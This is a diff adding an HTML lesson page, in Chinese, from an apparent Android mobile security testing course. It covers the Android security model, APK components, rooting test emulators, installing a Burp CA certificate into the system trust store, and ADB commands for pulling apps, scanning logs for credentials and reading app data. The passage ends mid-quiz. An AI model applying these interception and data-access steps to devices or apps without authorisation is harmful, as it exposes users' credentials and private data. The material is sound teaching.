@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stage 05 — Android 移動安全 | SEC_TRACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#070b0a;--bg2:#0b100f;--bg3:#101614;--sur:#161e1c;--bdr:#1d2826;
+  --acc:#00c896;--acc2:#00a87e;--txt:#d8ede8;--txt2:#7a9b94;--txt3:#3d5550;
+  --red:#f05252;--org:#f59e0b;--ylw:#fbbf24;--pur:#a78bfa;--cyn:#22d3ee;--rose:#fb7185;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Noto Sans TC',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;}
+body::before{content:'';position:fixed;inset:0;background:
+  radial-gradient(ellipse 55% 35% at 10% 0%,rgba(0,200,150,.04) 0%,transparent 55%),
+  radial-gradient(ellipse 45% 30% at 90% 100%,rgba(0,168,126,.04) 0%,transparent 55%);
+  pointer-events:none;z-index:0;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 36px;background:rgba(7,11,10,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--bdr);}
+.n-logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.95rem;color:var(--acc);text-decoration:none;}
+.n-logo span{color:var(--txt3);}
+.n-mid{display:flex;align-items:center;gap:10px;}
+.s-pill{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:20px;background:rgba(0,200,150,.1);color:var(--acc);border:1px solid rgba(0,200,150,.28);}
+.n-sname{font-size:.8rem;color:var(--txt2);}
+.n-back{font-size:.8rem;color:var(--txt3);text-decoration:none;transition:color .2s;}
+.n-back:hover{color:var(--acc);}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:100vh;padding-top:60px;}
+.sidebar{position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto;background:var(--bg2);border-right:1px solid var(--bdr);display:flex;flex-direction:column;z-index:10;}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-h{padding:22px 22px 16px;border-bottom:1px solid var(--bdr);flex-shrink:0;}
+.sb-tag{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--acc);letter-spacing:.14em;text-transform:uppercase;margin-bottom:6px;}
+.sb-title{font-size:.88rem;font-weight:700;line-height:1.45;margin-bottom:13px;}
+.sb-meta{display:flex;gap:16px;}
+.sm-item{display:flex;flex-direction:column;gap:2px;}
+.sm-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:700;color:var(--acc);}
+.sm-key{font-size:.62rem;color:var(--txt3);letter-spacing:.06em;text-transform:uppercase;}
+.sb-nav{flex:1;overflow-y:auto;padding:6px 0;}
+.ch-btn{width:100%;display:flex;align-items:center;gap:9px;padding:9px 22px;background:none;border:none;border-bottom:1px solid rgba(29,40,38,.7);color:var(--txt2);font-family:'Noto Sans TC',sans-serif;font-size:.79rem;font-weight:500;cursor:pointer;text-align:left;transition:color .18s,background .18s;}
+.ch-btn:hover{color:var(--txt);background:var(--bg3);}
+.ch-btn.cact{color:var(--acc);}
+.ch-num{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);min-width:26px;flex-shrink:0;}
+.ch-btn.cact .ch-num{color:var(--acc);}
+.ch-arr{font-size:.52rem;color:var(--txt3);transition:transform .2s;flex-shrink:0;}
+.ch-btn.copen .ch-arr{transform:rotate(90deg);}
+.ls-list{display:none;flex-direction:column;background:rgba(0,0,0,.15);}
+.ls-list.lopen{display:flex;}
+.ls-btn{display:flex;align-items:flex-start;gap:9px;padding:7px 22px 7px 44px;background:none;border:none;border-bottom:1px solid rgba(29,40,38,.4);color:var(--txt3);font-family:'Noto Sans TC',sans-serif;font-size:.74rem;cursor:pointer;text-align:left;width:100%;transition:color .18s,background .18s;line-height:1.4;}
+.ls-btn:hover{color:var(--txt2);background:rgba(0,200,150,.03);}
+.ls-btn.lact{color:var(--acc);background:rgba(0,200,150,.06);}
+.ls-btn.ldone{color:var(--txt3);}
+.ls-dot{width:5px;height:5px;border-radius:50%;background:var(--bdr);flex-shrink:0;margin-top:5px;transition:background .2s;}
+.ls-btn.lact .ls-dot{background:var(--acc);}
+.ls-btn.ldone .ls-dot{background:var(--acc);}
+.sb-f{padding:13px 22px;border-top:1px solid var(--bdr);flex-shrink:0;}
+.pr{display:flex;justify-content:space-between;font-size:.68rem;color:var(--txt3);margin-bottom:6px;}
+.pt{height:3px;background:var(--bdr);border-radius:2px;overflow:hidden;}
+.pf{height:100%;background:var(--acc);border-radius:2px;transition:width .4s;}
+.main{position:relative;z-index:1;display:flex;flex-direction:column;}
+.lh{padding:38px 56px 30px;border-bottom:1px solid var(--bdr);background:linear-gradient(180deg,rgba(0,200,150,.03) 0%,transparent 100%);}
+.lh-crumb{font-family:'JetBrains Mono',monospace;font-size:.63rem;color:var(--txt3);letter-spacing:.08em;margin-bottom:11px;}
+.lh-crumb em{color:var(--acc);font-style:normal;}
+.lh-title{font-size:1.6rem;font-weight:800;letter-spacing:-.02em;line-height:1.2;margin-bottom:11px;}
+.lh-chips{display:flex;gap:8px;flex-wrap:wrap;}
+.chip{padding:3px 11px;border-radius:20px;font-size:.67rem;font-family:'JetBrains Mono',monospace;letter-spacing:.04em;border:1px solid var(--bdr);color:var(--txt3);}
+.chip.ac{border-color:rgba(0,200,150,.4);color:var(--acc);}
+.cw{padding:38px 56px 80px;max-width:880px;}
+.cb{display:none;}
+.cb.on{display:block;animation:rise .25s ease both;}
+@keyframes rise{from{opacity:0;transform:translateY(7px);}to{opacity:1;transform:none;}}
+h2{font-size:1.25rem;font-weight:800;letter-spacing:-.01em;margin:36px 0 13px;color:var(--txt);display:flex;align-items:center;gap:10px;}
+h2::before{content:'';display:inline-block;width:3px;height:1.1em;border-radius:2px;background:var(--acc);flex-shrink:0;}
+h2:first-child{margin-top:0;}
+h3{font-size:.98rem;font-weight:700;margin:22px 0 9px;color:var(--txt);}
+p{font-size:.9rem;line-height:1.85;color:var(--txt2);margin-bottom:11px;font-weight:300;}
+strong{color:var(--txt);font-weight:600;}
+code{font-family:'JetBrains Mono',monospace;font-size:.8em;background:var(--sur);border:1px solid var(--bdr);padding:1px 6px;border-radius:3px;color:var(--acc);}
+.note{border-left:3px solid;padding:13px 17px;margin:18px 0;border-radius:0 4px 4px 0;}
+.note-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.12em;text-transform:uppercase;font-weight:700;margin-bottom:6px;}
+.note p{margin:0;font-size:.86rem;line-height:1.7;}
+.note.tip{border-color:var(--acc);background:rgba(0,200,150,.06);}
+.note.tip .note-lbl{color:var(--acc);}
+.note.warn{border-color:var(--org);background:rgba(245,158,11,.07);}
+.note.warn .note-lbl{color:var(--org);}
+.note.sec{border-color:var(--cyn);background:rgba(34,211,238,.06);}
+.note.sec .note-lbl{color:var(--cyn);}
+.note.danger{border-color:var(--red);background:rgba(240,82,82,.07);}
+.note.danger .note-lbl{color:var(--red);}
+.note.law{border-color:var(--pur);background:rgba(167,139,250,.07);}
+.note.law .note-lbl{color:var(--pur);}
+.cblock{background:#050807;border:1px solid var(--bdr);border-radius:6px;margin:16px 0;overflow:hidden;}
+.ctop{display:flex;align-items:center;justify-content:space-between;padding:7px 15px;background:rgba(16,22,20,.8);border-bottom:1px solid var(--bdr);}
+.clang{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);letter-spacing:.1em;text-transform:uppercase;}
+.ccopy{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);background:none;border:none;cursor:pointer;transition:color .2s;}
+.ccopy:hover{color:var(--acc);}
+pre{padding:16px 20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.75;color:#c8ddd8;}
+pre .kw{color:#c792ea;}pre .fn{color:#82aaff;}pre .st{color:#c3e88d;}pre .cm{color:#354e48;font-style:italic;}
+pre .nu{color:#f78c6c;}pre .tg{color:#f07178;}pre .at{color:#ffcb6b;}pre .vl{color:#c3e88d;}
+pre .sl{color:#89ddff;}pre .op{color:#89ddff;}pre .hl{background:rgba(0,200,150,.1);border-radius:2px;padding:0 2px;}
+.tbl{overflow-x:auto;margin:16px 0;}
+table.t{width:100%;border-collapse:collapse;font-size:.82rem;}
+table.t th{background:var(--sur);padding:9px 14px;text-align:left;font-size:.63rem;font-family:'JetBrains Mono',monospace;color:var(--txt3);letter-spacing:.08em;text-transform:uppercase;border:1px solid var(--bdr);}
+table.t td{padding:9px 14px;border:1px solid var(--bdr);color:var(--txt2);font-weight:300;vertical-align:top;line-height:1.55;}
+table.t tr:hover td{background:var(--bg3);}
+.mc{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--acc);}
+.kg{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:16px 0;}
+.kt{background:var(--bg2);padding:14px 17px;}
+.kt-n{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--acc);font-weight:700;margin-bottom:5px;}
+.kt-d{font-size:.79rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.ilist{display:flex;flex-direction:column;border:1px solid var(--bdr);border-radius:4px;overflow:hidden;margin:16px 0;}
+.il-item{display:flex;align-items:flex-start;gap:13px;padding:12px 17px;border-bottom:1px solid var(--bdr);transition:background .15s;}
+.il-item:last-child{border-bottom:none;}
+.il-item:hover{background:var(--bg3);}
+.il-num{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--acc);min-width:24px;flex-shrink:0;padding-top:2px;font-weight:700;}
+.il-txt{font-size:.85rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.il-txt strong{color:var(--txt);}
+.quiz{background:var(--bg3);border:1px solid var(--bdr);border-radius:6px;padding:22px;margin:26px 0;}
+.q-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--ylw);letter-spacing:.12em;text-transform:uppercase;margin-bottom:10px;}
+.q-q{font-size:.9rem;font-weight:600;margin-bottom:13px;line-height:1.5;color:var(--txt);}
+.q-opts{display:flex;flex-direction:column;gap:6px;}
+.qo{display:flex;align-items:flex-start;gap:10px;padding:8px 13px;border:1px solid var(--bdr);border-radius:4px;cursor:pointer;font-size:.83rem;color:var(--txt2);transition:all .18s;line-height:1.5;}
+.qo:hover{border-color:var(--acc);color:var(--txt);}
+.qo.ok{border-color:var(--acc);background:rgba(0,200,150,.07);color:var(--acc);}
+.qo.bad{border-color:var(--red);background:rgba(240,82,82,.07);color:var(--red);}
+.qo-k{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);min-width:16px;padding-top:1px;flex-shrink:0;}
+.q-exp{display:none;margin-top:12px;padding:11px 14px;background:rgba(0,200,150,.05);border-left:2px solid var(--acc);border-radius:0 4px 4px 0;font-size:.82rem;color:var(--txt2);line-height:1.65;}
+.q-exp.on{display:block;}
+.atkflow{display:flex;flex-direction:column;gap:3px;margin:18px 0;}
+.af-step{display:flex;align-items:flex-start;gap:13px;padding:13px 16px;background:var(--sur);border:1px solid var(--bdr);border-radius:4px;position:relative;}
+.af-step::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--bdr);border-radius:4px 0 0 4px;}
+.af-step.s1::before{background:var(--acc);}
+.af-step.s2::before{background:var(--cyn);}
+.af-step.s3::before{background:var(--ylw);}
+.af-step.s4::before{background:var(--org);}
+.af-step.s5::before{background:var(--red);}
+.af-step.s6::before{background:var(--pur);}
+.af-n{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);font-weight:700;min-width:44px;flex-shrink:0;padding-top:2px;letter-spacing:.04em;}
+.af-t{font-size:.82rem;font-weight:700;color:var(--txt);margin-bottom:4px;}
+.af-d{font-size:.78rem;color:var(--txt2);line-height:1.55;font-weight:300;}
+.done-banner{background:linear-gradient(135deg,rgba(0,200,150,.07),rgba(0,168,126,.05));border:1px solid rgba(0,200,150,.2);border-radius:6px;padding:28px;margin:34px 0 14px;text-align:center;}
+.done-banner h3{font-size:1.1rem;font-weight:800;color:var(--acc);margin-bottom:8px;}
+.done-banner p{font-size:.87rem;margin-bottom:20px;}
+.btn-row{display:flex;gap:11px;justify-content:center;flex-wrap:wrap;}
+.btn-p{display:inline-block;padding:10px 24px;background:var(--acc);color:var(--bg);text-decoration:none;font-weight:700;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-p:hover{background:#00dba6;transform:translateY(-1px);}
+.btn-g{display:inline-block;padding:10px 24px;border:1px solid var(--bdr);color:var(--txt2);text-decoration:none;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-g:hover{border-color:var(--acc);color:var(--acc);}
+.lnav{display:flex;justify-content:space-between;align-items:center;padding:22px 56px;border-top:1px solid var(--bdr);background:var(--bg2);position:sticky;bottom:0;z-index:5;}
+.lb{display:flex;align-items:center;gap:7px;padding:8px 18px;border:1px solid var(--bdr);border-radius:4px;background:none;color:var(--txt2);font-size:.82rem;cursor:pointer;font-family:'Noto Sans TC',sans-serif;transition:all .18s;}
+.lb:hover:not(:disabled){border-color:var(--acc);color:var(--acc);}
+.lb.pri{background:var(--acc);color:var(--bg);border-color:var(--acc);font-weight:700;}
+.lb.pri:hover:not(:disabled){background:#00dba6;}
+.lb:disabled{opacity:.2;cursor:not-allowed;}
+.ln-mid{text-align:center;}
+.ln-cnt{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);}
+.ln-sub{font-size:.75rem;color:var(--txt3);margin-top:3px;max-width:260px;}
+@media(max-width:900px){.layout{grid-template-columns:1fr;}.sidebar{position:static;height:auto;}.lh,.cw{padding-left:20px;padding-right:20px;}.lnav{padding:16px 20px;}.kg{grid-template-columns:1fr;}.ln-sub{display:none;}}
+</style>
+</head>
+<body>
+<nav>
+  <a href="index.html" class="n-logo">SEC<span>_</span>TRACK</a>
+  <div class="n-mid"><span class="s-pill">STAGE 05</span><span class="n-sname">Android 移動安全</span></div>
+  <a href="index.html" class="n-back">&#8592; 首頁</a>
+</nav>
+
+<div class="layout">
+<aside class="sidebar">
+  <div class="sb-h">
+    <div class="sb-tag">STAGE 05 · 3週</div>
+    <div class="sb-title">Android 移動應用<br>安全測試</div>
+    <div class="sb-meta">
+      <div class="sm-item"><span class="sm-val">5</span><span class="sm-key">章節</span></div>
+      <div class="sm-item"><span class="sm-val">20</span><span class="sm-key">課程</span></div>
+      <div class="sm-item"><span class="sm-val">3週</span><span class="sm-key">時長</span></div>
+    </div>
+  </div>
+  <div class="sb-nav">
+    <div><button class="ch-btn copen cact" onclick="toggleCh(this,'ch1')"><span class="ch-num">CH1</span><span class="ch-name">Android 安全基礎</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list lopen" id="ch1">
+      <button class="ls-btn lact" onclick="go('l1-1',this)"><span class="ls-dot"></span>Android 架構與安全模型</button>
+      <button class="ls-btn" onclick="go('l1-2',this)"><span class="ls-dot"></span>APK 結構解析與組件安全</button>
+      <button class="ls-btn" onclick="go('l1-3',this)"><span class="ls-dot"></span>測試環境搭建：模擬器與真機</button>
+      <button class="ls-btn" onclick="go('l1-4',this)"><span class="ls-dot"></span>ADB 工具完整指南</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch2')"><span class="ch-num">CH2</span><span class="ch-name">靜態分析</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch2">
+      <button class="ls-btn" onclick="go('l2-1',this)"><span class="ls-dot"></span>APK 反編譯：jadx / apktool</button>
+      <button class="ls-btn" onclick="go('l2-2',this)"><span class="ls-dot"></span>AndroidManifest 安全審計</button>
+      <button class="ls-btn" onclick="go('l2-3',this)"><span class="ls-dot"></span>代碼審計：敏感信息與危險 API</button>
+      <button class="ls-btn" onclick="go('l2-4',this)"><span class="ls-dot"></span>資源與資產提取分析</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch3')"><span class="ch-num">CH3</span><span class="ch-name">動態分析</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch3">
+      <button class="ls-btn" onclick="go('l3-1',this)"><span class="ls-dot"></span>HTTP(S) 流量抓包：Burp + 憑證繞過</button>
+      <button class="ls-btn" onclick="go('l3-2',this)"><span class="ls-dot"></span>Frida 動態插樁入門</button>
+      <button class="ls-btn" onclick="go('l3-3',this)"><span class="ls-dot"></span>Frida Hook 實戰：繞過登入與加密</button>
+      <button class="ls-btn" onclick="go('l3-4',this)"><span class="ls-dot"></span>Objection 自動化測試框架</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch4')"><span class="ch-num">CH4</span><span class="ch-name">常見漏洞攻防</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch4">
+      <button class="ls-btn" onclick="go('l4-1',this)"><span class="ls-dot"></span>不安全的數據存儲</button>
+      <button class="ls-btn" onclick="go('l4-2',this)"><span class="ls-dot"></span>WebView 漏洞：XSS 與 UXSS</button>
+      <button class="ls-btn" onclick="go('l4-3',this)"><span class="ls-dot"></span>Intent 劫持與深度連結濫用</button>
+      <button class="ls-btn" onclick="go('l4-4',this)"><span class="ls-dot"></span>Root 檢測與憑證固定繞過</button>
+      <button class="ls-btn" onclick="go('l4-5',this)"><span class="ls-dot"></span>Android 加固與反加固技術</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch5')"><span class="ch-num">CH5</span><span class="ch-name">測試報告與自動化</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch5">
+      <button class="ls-btn" onclick="go('l5-1',this)"><span class="ls-dot"></span>MobSF 自動化掃描</button>
+      <button class="ls-btn" onclick="go('l5-2',this)"><span class="ls-dot"></span>OWASP Mobile Top 10 對照</button>
+      <button class="ls-btn" onclick="go('l5-3',this)"><span class="ls-dot"></span>移動安全測試報告撰寫</button>
+    </div></div>
+  </div>
+  <div class="sb-f">
+    <div class="pr"><span>學習進度</span><span id="pct">0%</span></div>
+    <div class="pt"><div class="pf" id="pf" style="width:0%"></div></div>
+  </div>
+</aside>
+
+<main class="main">
+  <div class="lh">
+    <div class="lh-crumb" id="crumb">STAGE 05 &gt; CH1 &gt; <em>課程 1</em></div>
+    <h1 class="lh-title" id="ltitle">Android 架構與安全模型</h1>
+    <div class="lh-chips">
+      <span class="chip ac" id="chip1">基礎架構</span>
+      <span class="chip" id="chip2">20 分鐘</span>
+    </div>
+  </div>
+  <div class="cw">
+
+<!-- L1-1 Android 架構 -->
+<div class="cb on" id="l1-1">
+<h2>Android 架構與安全模型</h2>
+<p>Android 安全模型建立在 Linux 核心之上，透過多層防禦機制保護用戶數據和系統資源。理解這些機制是進行移動安全測試的基礎。</p>
+
+<h3>Android 分層架構</h3>
+<div class="atkflow">
+  <div class="af-step s1"><span class="af-n">Layer 5</span><div><div class="af-t">應用層（Applications）</div><div class="af-d">用戶安裝的 App（含系統 App），每個 App 在獨立沙盒中運行。測試的主要目標層級。</div></div></div>
+  <div class="af-step s2"><span class="af-n">Layer 4</span><div><div class="af-t">應用框架層（Application Framework）</div><div class="af-d">ActivityManager、PackageManager、ContentResolver 等。四大組件（Activity/Service/BroadcastReceiver/ContentProvider）的管理核心，許多漏洞源於此層的錯誤使用。</div></div></div>
+  <div class="af-step s3"><span class="af-n">Layer 3</span><div><div class="af-t">Android Runtime / 原生庫</div><div class="af-d">ART 虛擬機執行 .dex 字節碼；OpenSSL、SQLite、WebKit 等原生庫。第三方庫漏洞（如 CVE 的 OpenSSL 漏洞）在此層影響。</div></div></div>
+  <div class="af-step s4"><span class="af-n">Layer 2</span><div><div class="af-t">硬體抽象層（HAL）</div><div class="af-d">攝像頭、藍牙、GPS 等硬體接口。固件漏洞和驅動漏洞在此層。</div></div></div>
+  <div class="af-step s5"><span class="af-n">Layer 1</span><div><div class="af-t">Linux 核心（Kernel）</div><div class="af-d">基於 Linux 的系統核心，提供進程隔離（UID/GID 機制）、SELinux 強制訪問控制、Seccomp 系統調用過濾。</div></div></div>
+</div>
+
+<h3>Android 核心安全機制</h3>
+<div class="kg">
+  <div class="kt"><div class="kt-n">應用沙盒（App Sandbox）</div><div class="kt-d">每個 App 分配唯一 UID，進程相互隔離。App A 的文件對 App B 不可見（除非明確共享）。Root 後沙盒失效。</div></div>
+  <div class="kt"><div class="kt-n">權限系統（Permissions）</div><div class="kt-d">訪問相機、位置、聯繫人等敏感資源需在 Manifest 聲明並由用戶授權（Android 6.0+ 運行時權限）。過度請求權限是安全問題。</div></div>
+  <div class="kt"><div class="kt-n">SELinux</div><div class="kt-d">強制訪問控制（MAC），即使獲取 root 也受到 SELinux 策略限制。Permissive 模式下 SELinux 不阻止但記錄違規。</div></div>
+  <div class="kt"><div class="kt-n">應用簽名（Code Signing）</div><div class="kt-d">所有 APK 必須使用開發者密鑰簽名。系統用簽名驗證 App 完整性，防止篡改後安裝。V1/V2/V3 簽名方案遞進增強。</div></div>
+  <div class="kt"><div class="kt-n">KeyStore 系統</div><div class="kt-d">Android 提供的硬體安全存儲，用於保存加密密鑰和憑證。在 TEE（可信執行環境）中執行加密操作，密鑰無法被提取。</div></div>
+  <div class="kt"><div class="kt-n">SafetyNet / Play Integrity</div><div class="kt-d">Google 的設備完整性認證 API，用於檢測 Root、解鎖 Bootloader、Hook 框架等。銀行/金融 App 廣泛使用，可被 Magisk 等工具繞過。</div></div>
+</div>
+
+<div class="note tip">
+  <div class="note-lbl">移動安全測試核心思路</div>
+  <p>Android 安全測試的本質是<strong>突破沙盒邊界</strong>和<strong>發現組件暴露</strong>。測試者需要以一個惡意 App 或中間人的視角思考：這個 App 是否把敏感數據寫到了外部存儲？有沒有暴露了可被其他 App 調用的組件？有沒有在通訊層進行充分加密驗證？</p>
+</div>
+</div>
+
+<!-- L1-2 APK 結構 -->
+<div class="cb" id="l1-2">
+<h2>APK 結構解析與四大組件安全</h2>
+<p>APK（Android Package）本質上是一個 ZIP 壓縮包。理解其內部結構是靜態分析的起點。</p>
+
+<h3>APK 內部結構</h3>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>文件/目錄</th><th>內容</th><th>安全關注點</th></tr></thead>
+    <tbody>
+      <tr><td class="mc">AndroidManifest.xml</td><td>App 配置：組件聲明、權限請求、最低 SDK 版本</td><td>組件是否過度暴露、是否允許備份、debuggable 是否開啟</td></tr>
+      <tr><td class="mc">classes.dex</td><td>Dalvik 字節碼（Java/Kotlin 代碼編譯後的格式）</td><td>反編譯後查找硬編碼密鑰、危險 API 調用</td></tr>
+      <tr><td class="mc">res/</td><td>XML 佈局、字串資源、圖片等</td><td>res/raw/ 中可能存放敏感配置文件</td></tr>
+      <tr><td class="mc">assets/</td><td>原始資源文件（不編譯），App 可直接讀取</td><td>可能包含配置文件、SQLite DB、加密密鑰</td></tr>
+      <tr><td class="mc">lib/</td><td>原生庫（.so 文件），按 CPU 架構分目錄</td><td>逆向 .so 可能找到硬編碼邏輯或隱藏 API Key</td></tr>
+      <tr><td class="mc">META-INF/</td><td>簽名信息（MANIFEST.MF、CERT.RSA）</td><td>重打包 APK 後簽名驗證失效，需重新簽名</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<h3>四大組件與暴露風險</h3>
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>Activity</strong> — 用戶界面頁面。若設置 <code>exported="true"</code> 且無權限保護，任意 App 均可啟動。攻擊者可用 <code>adb shell am start</code> 直接跳轉到登入後的頁面，繞過認證。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>Service</strong> — 後台服務。若暴露且無鑒權，外部 App 可與其交互。某些 Service 處理敏感操作（如支付），未授權調用可導致業務邏輯漏洞。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>BroadcastReceiver</strong> — 廣播接收器。若設置 <code>exported="true"</code> 且無簽名權限保護，任意 App 可發送偽造廣播。曾有 App 的 SMS 接收器被惡意 App 劫持。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>ContentProvider</strong> — 數據提供者。若 <code>exported="true"</code> 且 <code>readPermission</code>/<code>writePermission</code> 未設置，任意 App 可讀寫其管理的數據庫，導致數據洩露或注入攻擊（SQL Injection through ContentProvider）。</div></div>
+</div>
+</div>
+
+<!-- L1-3 環境搭建 -->
+<div class="cb" id="l1-3">
+<h2>測試環境搭建：模擬器與真機</h2>
+
+<h3>方案對比</h3>
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>方案</th><th>優點</th><th>缺點</th><th>推薦場景</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Android Studio 模擬器</strong></td><td>免費，快速創建，支持多版本</td><td>性能較慢，部分硬體功能模擬不完整，Root 需額外操作</td><td>日常靜態分析、基礎動態測試</td></tr>
+      <tr><td><strong>Genymotion</strong></td><td>速度快，商業版功能豐富，易 Root</td><td>免費版有功能限制</td><td>快速測試、CTF</td></tr>
+      <tr><td><strong>Pixel 真機 + Magisk Root</strong></td><td>最接近真實環境，支持所有硬體</td><td>需要購買設備，刷機有一定門檻</td><td>金融/銀行類 App 測試、生產環境評估</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">測試環境初始化</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── Android Studio AVD 配置要點 ───</span>
+<span class="cm"># 1. 選擇 "Google APIs" 鏡像（包含 Play Store），非 "Google Play" 鏡像（有限制）</span>
+<span class="cm"># 2. 建議選 API 28-30（Android 9-11），較新版本對動態分析有更多限制</span>
+<span class="cm"># 3. x86_64 架構速度最快（通過 HAXM/Hypervisor 加速）</span>
+
+<span class="cm"># ─── 快速 Root 模擬器（推薦 Genymotion）───</span>
+<span class="cm"># 下載後直接啟動，默認已 Root</span>
+<span class="cm"># 或使用 Google APIs 模擬器（非 Play Store 版）：</span>
+<span class="cm"># adb root  → 切換到 root 模式（僅 Google APIs 鏡像可用）</span>
+adb root
+adb remount    <span class="cm"># 掛載系統分區為可寫</span>
+
+<span class="cm"># ─── 安裝 Burp CA 憑證到模擬器系統信任存儲 ───</span>
+<span class="cm"># 步驟1：從 Burp Suite 導出 DER 格式憑證</span>
+<span class="cm"># 步驟2：轉換格式並計算文件名</span>
+openssl x509 -inform DER -in burp.der -out burp.pem
+openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1
+<span class="cm"># 輸出 hash 值（如 9a5ba575）→ 文件名為 9a5ba575.0</span>
+
+<span class="cm"># 步驟3：推送到系統憑證目錄</span>
+adb root
+adb remount
+adb push 9a5ba575.0 /system/etc/security/cacerts/
+adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
+adb reboot</pre>
+</div>
+</div>
+
+<!-- L1-4 ADB -->
+<div class="cb" id="l1-4">
+<h2>ADB 工具完整指南</h2>
+<p>ADB（Android Debug Bridge）是 Android 開發和安全測試最基礎的工具，幾乎所有動態分析操作都要用到它。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">ADB — 完整命令速查</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 設備連接與管理 ───</span>
+adb devices                        <span class="cm"># 列出已連接設備</span>
+adb -s emulator-5554 shell         <span class="cm"># 指定設備連接（多設備時）</span>
+adb connect 192.168.1.100:5555     <span class="cm"># TCP 無線連接</span>
+
+<span class="cm"># ─── 應用管理 ───</span>
+adb install app.apk                <span class="cm"># 安裝 APK</span>
+adb install -r app.apk             <span class="cm"># 覆蓋安裝（保留數據）</span>
+adb uninstall com.example.app      <span class="cm"># 卸載（包名）</span>
+adb shell pm list packages         <span class="cm"># 列出所有已安裝包名</span>
+adb shell pm list packages -3      <span class="cm"># 只列出第三方 App</span>
+adb shell pm path com.example.app  <span class="cm"># 查找 APK 路徑</span>
+
+<span class="cm"># ─── 提取 APK（從設備導出 App 進行分析）───</span>
+adb shell pm path com.target.app
+<span class="cm"># 輸出：package:/data/app/com.target.app-xxx.apk</span>
+adb pull /data/app/com.target.app-xxx.apk ./target.apk
+
+<span class="cm"># ─── 文件傳輸 ───</span>
+adb push local_file.txt /sdcard/
+adb pull /sdcard/remote_file.txt ./
+
+<span class="cm"># ─── 調試與日誌 ───</span>
+adb logcat                                   <span class="cm"># 查看所有日誌</span>
+adb logcat -s "com.example.app"             <span class="cm"># 過濾特定 App 日誌</span>
+adb logcat | grep -i "password\|token\|key" <span class="cm"># 查找敏感信息洩露</span>
+
+<span class="cm"># ─── Shell 操作 ───</span>
+adb shell                                    <span class="cm"># 進入 Shell</span>
+adb shell id                                 <span class="cm"># 查看當前用戶</span>
+adb shell dumpsys activity                  <span class="cm"># 查看 Activity 堆疊</span>
+adb shell am start -n com.pkg/.MainActivity  <span class="cm"># 啟動 Activity</span>
+adb shell am start -a android.intent.action.VIEW -d "app://target"  <span class="cm"># 測試深度連結</span>
+
+<span class="cm"># ─── 數據目錄訪問（需 root 或 run-as）───</span>
+adb shell run-as com.example.app ls /data/data/com.example.app/
+adb shell su -c "ls /data/data/com.example.app/"</pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
